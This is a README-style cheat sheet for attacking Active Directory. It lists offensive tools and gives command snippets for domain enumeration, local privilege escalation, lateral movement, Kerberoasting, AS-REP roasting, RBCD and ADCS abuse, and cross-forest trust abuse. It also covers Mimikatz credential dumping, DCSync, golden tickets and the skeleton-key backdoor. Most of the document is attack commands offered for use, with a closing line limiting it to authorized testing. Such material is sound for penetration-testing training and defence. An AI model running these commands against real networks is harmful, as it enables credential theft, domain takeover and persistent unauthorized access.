# Active Directory Exploitation Cheat Sheet

[![Tech](https://img.shields.io/badge/tech-ActiveDirectory-blue)](https://microsoft.com/activedirectory) [![License](https://img.shields.io/github/license)](https://github.com)

> This cheat sheet is inspired by the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo and curated for internal AD exploitation.

![Just Walking The Dog](https://github.com/buftas/Active-Directory-Exploitation-Cheatsheet/blob/master/WalkTheDog.png)

---

## Contents

* [Tools](#tools)
* [Domain Enumeration](#domain-enumeration)
* [Local Privilege Escalation](#local-privilege-escalation)
* [Lateral Movement](#lateral-movement)
* [Domain Privilege Escalation](#domain-privilege-escalation)
* [Domain Persistence](#domain-persistence)
* [Cross-Forest Attacks](#cross-forest-attacks)

---

## Tools

* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [Certify](https://github.com/GhostPack/Certify)
* [Powermad](https://github.com/Kevin-Robertson/Powermad)
* [Adalanche](https://github.com/lkarlslund/adalanche)

---

## Domain Enumeration

### PowerView Examples

```powershell
Get-Domain
Get-DomainUser -Identity <username> -Properties *
Find-DomainUserLocation
Get-DomainComputer -Ping
Get-DomainGroupMember -Identity 'Domain Admins'
Get-DomainTrust
Get-ForestTrust
```

\:mag\_right: **Tips**: Export results for later analysis:

```powershell
Get-DomainUser | Export-CliXml .\DomainUsers.xml
```

### AD Module Examples

```powershell
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter *
Get-ADDomainController
Get-ADTrust -Filter *
```

---

## Local Privilege Escalation

* [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [CVE-2021-36934](https://github.com/cube0x0/CVE-2021-36934)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1)

### Examples

```powershell
whoami /groups
icacls C:\ /findsid:S-1-5-32-544
```

---

## Lateral Movement

### PowerShell Remoting

```powershell
Enter-PSSession -ComputerName <hostname>
Invoke-Command -ComputerName <host> -ScriptBlock {whoami}
```

### Mimikatz Token Stealing

```text
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

---

## Domain Privilege Escalation

### Kerberoasting

```powershell
Get-NetUser -SPN
Invoke-Kerberoast
```

### ASREPRoasting

```powershell
Get-DomainUser -PreauthNotRequired
Invoke-ASREPRoast
```

### RBCD

```powershell
New-MachineAccount
Set-DomainObject -Set @{msds-allowedtoactonbehalfofotheridentity=...}
Rubeus.exe s4u /user:<machine> /impersonateuser:Administrator /ptt
```

### ADCS Abuse

```powershell
Certify.exe find /vulnerable /quiet
Rubeus.exe asktgt ... /certificate:cert.pfx /ptt
```

---

## Domain Persistence

### Golden Ticket

```powershell
Invoke-Mimikatz -Command "lsadump::lsa /patch"
Invoke-Mimikatz -Command "kerberos::golden ... /ptt"
```

### DCSync

```powershell
lsadump::dcsync /user:<domain\\user>
```

### Skeleton Key

```powershell
Invoke-Mimikatz -Command "misc::skeleton"
```

---

## Cross-Forest Attacks

### Trust Abuse

```powershell
lsadump::trust /patch
kerberos::golden /service:krbtgt /target:<trusteddomain>
```

### Rubeus Trust Ticket

```powershell
Rubeus.exe asktgs /ticket:<kirbi> /service:cifs/target.domain
```

---

### \:link: References

* [PayloadAllTheThings - AD](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack%20Cheatsheet)
* [Harmj0y - Blog](https://www.harmj0y.net/blog/)
* [ADSecurity.org](https://adsecurity.org)

---

> ⚠️ This cheat sheet is for educational and authorized security testing purposes only.

